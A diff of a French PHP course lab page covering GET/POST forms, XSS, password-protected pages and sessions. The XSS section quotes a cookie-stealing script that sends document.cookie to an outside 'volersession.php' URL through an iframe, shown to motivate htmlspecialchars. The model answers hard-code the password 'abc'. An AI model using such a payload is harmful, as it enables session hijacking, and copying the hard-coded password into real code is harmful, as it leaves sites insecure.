@@ -28,9 +28,10 @@
 		.reponse_ { padding-left:3em ; }
 		
 		.greenNum, .blueNum, .redNum { 
-		    color:#115; 
+		    color:black; 
             border-radius:50px;		
 		}
+		/********** ça fait un peu tâche. je vire tout pour faire propre( du noir sur fond blanc ) **************
 		.greenNum { 
 			box-shadow:
               0px 2px 4px 0px #4CAF50 inset,
@@ -45,6 +46,12 @@
 			box-shadow:
               0px 2px 4px 0px #a1008c inset,
               0px 2px 4px 0px inset;		
+		}
+		*********************************************************************************************/
+		.greenNum, .blueNum, .redNum { 
+			box-shadow:
+			0px 16px 4px 0px white inset,
+            0px 2px 4px 0px inset;		
 		}
 		.img{ 
 
@@ -108,6 +115,14 @@
 		  background:#ff1;
 		  border-radius:2px;
 		  padding:2px;
+		}
+        .indication{
+		   margin-top:0;
+		   padding-top:0;
+		   margin-bottom:0;
+		   padding-bottom:0;
+		   background:transparent !important;
+		   border:none;
 		}		
 	</style>
 
@@ -575,8 +590,8 @@ scp -r -P 60022 tp1 myLogin@193.54.166.23:public_html/PHP2/tp1
 </source></code></pre>
 					</details>
 					<p></p>
-					
-					<b class="greenNum">&#9315;</b> Ajouter dans le formulaire<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9314;</small> &emsp; GET : &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
+					&emsp;Ajouter dans le formulaire<br>
 					<ul type="disc" class="questions_" >
                          <li >4.1 Un champs <b>puniton</b>(string)</li>
                          <li >4.2 Un champs <b>nbFois</b>(int): 10 par défaut</li>
@@ -652,8 +667,8 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</div>
 					</details>
 					<p></p>
-					
-					<b class="greenNum">&#9316;</b> Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9315;</small> &emsp; POST: &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
+					&emsp;Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
 					<ul type="disc" class="questions_" >
                          <li>Dans <b>form.php</b>: Remplacer <b>GET</b> par <b>POST</b> </li>					
 						 <li>Qu'est-ce qui change ?</li>						 
@@ -666,9 +681,11 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 </div>
 					</details>
 					<p></p>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9316;</small> &emsp; Failles XSS &emsp; <i style="color:#115;">Injection de code HTML/JS</i> </b></span><br>
+					&emsp;<b style="line-height:1.5em">Vulnérabilté  du fichier traitement</b>(corps.php)<p></p>
+					&emsp;Il peut être appelé par n'importe quelle page( pas seulement form.php)
 					
-					<b class="greenNum">&#9317;</b> <b>Vulnérabilté  du fichier traitement</b>(corps.php)<br>
-					<span style="line-height:2em"> &emsp;&nbsp;&nbsp; Il peut être appelé par n'importe quelle page( pas seulement form.php)</span>
+					
 					<ul type="disc" class="questions_" >
 					     <li>Quelle conséquence ?! </li>
 						 <li>Et si on met du code HTML dans le champs <b>nom</b> !</li>
@@ -683,7 +700,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 							   <li><b>Injection javaScript</b>: Voler le cookie contenant les paramètres de connexion( en utilisant une rédirection javaScript)</li>
 							</ul>							
 						 </div>
-						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
+						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;; background:#d2f2df !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
 <pre><code class="language-html" ><source lang="html">
 &lt;script>
      document.write('&lt;iframe src="https://www.lije-creative.com/volersession.php?'+ 
@@ -692,8 +709,8 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 </source></code></pre>
 					</details>
 					<p></p>
-					
-					<b class="greenNum">&#9318;</b> Comment résoudre le problème précédent ?<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9317;</small> &emsp; Fonctions &emsp; <i style="color:#115;"><b>html<span style="color:#990033">special</span>chars()</b>,&emsp; <b><span style="color:#990033">strip_tags()</span></b></i> </b></span><br>
+					&emsp;Comment résoudre le problème précédent ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					    <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
@@ -720,8 +737,9 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 				
                 <!-- Exercice3 -->
 				<div class="danger_ structureSujet">
-					<p><u><a href="#"><strong>Exo3:</strong> prot&eacute;ger une page par mot de passe</a></u></p>					
-					<b class="redNum">&#9312;</b> Ajouter une page <b>form<span style="color:#a1008c">ulaire</span>.php</b> contenant:<br>
+					<p><u><a href="#"><strong>Exo3:</strong> Prot&eacute;ger une page par mot de passe</a> </u> &emsp;strcmp() </p>					
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9312;</small> &emsp; HTML: &emsp; <i style="color:#115;">Saisie <small style="color:gray">( interface d'entrée )</small></i> </b></span><br>
+					&emsp;Ajouter une page <b>form<span style="color:#a1008c">ulaire</span>.php</b> contenant:<br>
 					<ul type="disc" class="questions_" >
 					     <li>Un titre</li>
                          <li>Un formulaire avec un champs "<b>mot de passe</b>" et un champs "<b>Acc&eacute;der</b>"  </li>					
@@ -729,29 +747,106 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</ul>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 ...
+<pre><code class="language-html" ><source lang="html">
+/********  formulaire.php ******/
+&lt;!DOCTYPE html>
+&lt;html>
+&lt;head>
+	&lt;title>TP2: Exercice3&lt;/title>
+&lt;/head>
+&lt;body>
+	&lt;form action="pageProtege.php" method="post">
+		Password: &lt;input type="password" name="password">		
+	    &lt;input type="submit" name="submit" value="Acéder">
+	&lt;/form>
+&lt;/body>
+&lt;/html>	
+</source></code></pre>
 					</details>
 					<p></p>
-					<b class="redNum">&#9313;</b> Ajouter la page <b><span style="color:#a1008c">pageProtegee.php</span></b> qui, <br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9313;</small> &emsp; PHP: &emsp; <i style="color:#115;">Traitement <small style="color:gray">( fichier externe )</small></i> </b></span><br>
+					&emsp;Ajouter la page <b><span style="color:#a1008c">pageProtegee.php</span></b> qui, <br>
 					<ul type="disc" class="questions_" >
 					     <li> affiche un texte si le mot d'passe est correcte </li>
                          <li> affiche un message d'erreur le cas &eacute;ch&eacute;ant  </li>											 
 					</ul>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 ...
+<pre><code class="language-php" ><source lang="php">
+/********  pageProtege.php ******/
+&lt;div id="contenu">
+	&lt;h3> TP2: Exercice3&lt;/h3>
+&lt;/div>
+&lt;?php  
+  // COLLECT 
+  $motdepasse = 'abc';
+  $password=isset($_POST["password"]) ? $_POST["password"]:'';
+   
+  // CONTRÔLE DE SAISIE
+  if(empty($password)) echo 'Entrer votre password&lt;br>';
+   
+  // AFFICHAGE
+  $resultat = strcmp($motdepasse,$password);
+  if ($resultat !== 0) echo 'mot de passe erroné';		   
+  else  echo 'le cheval de Henti Iv était blanc';
+?>
+&lt;p>&lt;a href="formulaire.php"> Formulaire de saisie &lt;/a>&lt;/p>
+</source></code></pre>					
 					</details>
 					<p></p>
-					<b class="redNum">&#9314;</b> Reprendre la page <b>form<span style="color:#a1008c">ulaire</span>.php</b> :<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9314;</small> &emsp; HTML/PHP: &emsp; <i style="color:#115;">Saisie et traitement <small style="color:gray">( dans le même fichier )</small></i> </b></span><br>
+					&emsp;Reprendre la page <b>form<span style="color:#a1008c">ulaire</span>.php</b> :<br>
 					<ul type="disc" class="questions_" >
 					     <li>Dedans, ins&eacute;rer le contenu de la page <span style="color:#a1008c">pageProtegee.php</span></li>
                          <li>Le formulaire pointe donc sur lui-même</li>											 
 					</ul>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 ...
+<pre><code class="language-php" ><source lang="php">
+/********  formulaire.php ******/
+&lt;!DOCTYPE html>
+&lt;html>
+&lt;head>
+	&lt;title>TP2: Exercice3&lt;/title>
+&lt;/head>
+&lt;body>
+	&lt;form action="pageProtege.php" method="post">
+		Password: &lt;input type="password" name="password">		
+	    &lt;input type="submit" name="submit" value="Acéder">
+	&lt;/form>
+&lt;/body>
+&lt;/html>
+    <hr>	
+&lt;?php  
+  $motdepasse = 'abc';
+  
+  if(isset($_POST["password"]) && !empty($_POST["password"])){		
+		// COLLECTE
+		$password = $_POST["password"];
+		// AFFICHAGE
+		$resultat = strcmp($motdepasse,$password);
+		if ($resultat !== 0) echo 'mot de passe erroné';		   
+		else  echo 'le cheval de Henti Iv était blanc';	
+  }
+?>	
+</source></code></pre>
 					</details>
 					<p></p>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9315;</small> &emsp; Conclusion:  </b></span><br>
+				    <ul type="square" class="paragraphe petitParagraphe"> 
+					  <li>
+					     <b>Traitement dans le même fichier :</b><br>
+                         Pour eviter les erreurs "<b style="color:#990033">Notice indefined variable</b>":<br> 
+	                     Mettre tout le code à l'interieur d'<u>une grosse boucle</u> <b>if</b> qui teste la variable réçue, en utilisant <b>isset()</b> et <b>!empty()</b>
+					  </li>
+					  <li>
+					     <b>Traitement dans un autre fichier :</b><br>
+						 	On peut éviter ces <b style="color:#990033">erreurs</b> sans se taper <u>la grosse boucle</u>.
+							i suffit d'utiliser l'opérateur ternaire pour insptecter les variable :<br>
+							<code class="idS">$variable <b  style="color:#990033">=</b> isset($_POST["name"]) <b class="idS" style="color:#990099">?</b> $_POST["name"] <b class="idS" style="color:#990099">:</b> '';</code>
+					  </li>
+				    </ul><br>
+				
 				</div>
 				
 				
@@ -760,7 +855,8 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
                 <!-- Exercice4 -->
 				<div class="info_ structureSujet">
 					<p><u><a href="#"><strong>Exo4:</strong> Variables superglobales(les sessions)</a></u></p>
-					<b class="blueNum">&#9312;</b> Qu'est-ce qu'une variable SUPERGLOBALE ?<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9312;</small> &emsp; Variable &emsp; <i style="color:#115;">SUPERGLOBALE</i> </b></span><br>
+					&emsp;Qu'est-ce qu'une variable superglobale ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
@@ -768,7 +864,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</details>
 					<p></p>
 					
-					<b class="blueNum">&#9313;</b> Les principales sont:<br>
+					&emsp;Les principales sont:<br>
 					<ul type="square" class="questions_" >
                          <li>&dollar;_SERVER</li>
                          <li>&dollar;_ENV</li>
@@ -783,24 +879,27 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 						 ...
 					</details>
 					<p></p>
-					
-					<b class="blueNum">&#9314;</b> &Agrave; quoi sert la valeur contenu dans <b>&dollar;_SERVER['<span style="color:#f44336;">REMOTE_ADDR</span>']</b> ?<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9313;</small> &emsp; Valeur &emsp; <i style="color:#115;">REMOTE_ADDR</i> </b></span><br>
+					&emsp;&Agrave; quoi sert la valeur contenu dans <b>&dollar;_SERVER['<span style="color:#f44336;">REMOTE_ADDR</span>']</b> ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
 						 ...
 					</details>
 					<p></p>
-					
-					<b class="blueNum">&#9315;</b> &Agrave; quoi sert la variable <b>&dollar;_SESSION</b> ?<br>
+					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9314;</small> &emsp; Variable &emsp; <i style="color:#115;">&dollar;_SESSION</i> </b></span><br>
+					&emsp;&Agrave; quoi sert la variable <b>&dollar;_SESSION</b> ?<br>
 					<span style="line-height:1.5em; color:transparent;">...</span>
 					<details>
 					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
-						 ...
+						 <div class="paragraphe petitParagraphe">
+						    Pour conserver des variables sur toutes les pages du site et pendant toute la durée de présence de
+                            l’internaute, on utilise les sessions (plus facile qu’avec GET ou POST).
+						 </div>
 					</details>
 					<p></p>
 					
-					<b class="blueNum">&#9316;</b> Ajouter un fichier <b>login.php</b> contenant 3 variables session:<br>
+					&emsp;Ajouter un fichier <b>login.php</b> contenant 3 variables session:<br>
 					<ul type="square" class="questions_" >
 						 <li>&dollar;_SESSION['<span style="color:gray">nom</span>']</li>
 						 <li>&dollar;_SESSION['<span style="color:gray">prenom</span>']</li>
@@ -813,7 +912,7 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</details>
 					<p></p>
 					
-					<b class="blueNum">&#9317;</b> Reprendre le fichier <b>index.php</b> qui, maintenant appelle:<br>
+					&emsp;Reprendre le fichier <b>index.php</b> qui, maintenant appelle:<br>
 					<ul type="square" class="questions_" >
 						 <li>entete<span style="color:gray">.php</span></li>
 						 <li>login<span style="color:gray">.php</span></li>
@@ -822,6 +921,34 @@ nbFois:    &lt;input type="number" name="nbFois" value="10" >
 					</ul>
 					<ul type="none" class="questions_" >
 					  <li><img src="index.png" class="img"/></li>
+					</ul>
+
+					&emsp;Reprendre la page <b>login.php</b> qui, maintenant:<br>
+					<ul type="square" class="questions_" >
+					  <li>Pointe sur elle-même.</li>
+					  <li>Ajouter un lien vers <span style="color:#990033">infos.php</span></li>
+					</ul>
+					&emsp;Dans <span style="color:#990033">infos.php</span> :<br>
+					<ul type="square" class="questions_" >
+					  <li>Afficher les 3 variables session.</li>
+					  <li>Est-ce que <span style="color:#990033">infos.php</span> les voit bien?</li>
+					  <li>Ajouter un lien de "Déconnexion" qui ramène l’internaute à la page index.php et qui supprime la session</li>
+					  <li><b style="font-size:1em"><u>Indications</u></b>:</li>
+					</ul>
+
+					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important; " >
+			
+					  <li class="paragraphe petitParagraphe" style="background:#d2f2df !important; margin-top:0; margin-bottom:0; ">
+					     Pour ce faire, il faut une page de déconnexion intermédiaire (logout.php)
+                         qui<br> -  va d’abord appeler la fonction unset($ SESSION)<br> - avant session destroy()
+					  </li>
+		
+					  <li class="paragraphe petitParagraphe indication" style="margin:top:0; margin-left:-2em;">
+					     L’appel à index.php se fait grâce à header(’Location: index.php’)
+					  </li>
+					  <li class="paragraphe petitParagraphe indication" style="margin-left:-2em;" >
+					    header(’Location: index.php’)  permet de rediriger le navigateur 
+					  </li>
 					</ul>
 					
 					<details>
